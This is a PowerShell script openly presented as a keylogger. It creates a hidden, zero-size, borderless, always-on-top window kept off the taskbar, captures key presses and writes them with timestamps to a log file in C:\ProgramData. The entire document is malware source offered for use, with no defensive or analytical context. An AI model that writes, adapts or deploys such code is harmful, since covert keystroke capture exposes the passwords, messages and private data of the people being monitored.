# Define the log file path for the keylogger
$logFile = "C:\ProgramData\keylogger.txt"

# Function to log keystrokes
function Log-KeyStroke {
    param (
        [string]$key
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "$timestamp $key"
    Add-Content -Path $logFile -Value $logEntry
}

# Function to start the keylogger
function Start-KeyLogger {
    Add-Type -AssemblyName System.Windows.Forms

    # Create a new form to capture keystrokes
    $form = New-Object System.Windows.Forms.Form
    $form.Size = New-Object System.Drawing.Size(0, 0)
    $form.TopMost = $true
    $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
    $form.ShowInTaskbar = $false

    # Add a key down event handler to the form
    $form.add_KeyDown({
        $key = $_.KeyCode
        Log-KeyStroke $key
    })

    # Show the form
    $form.ShowDialog()
}

# Start the keylogger
Start-KeyLogger
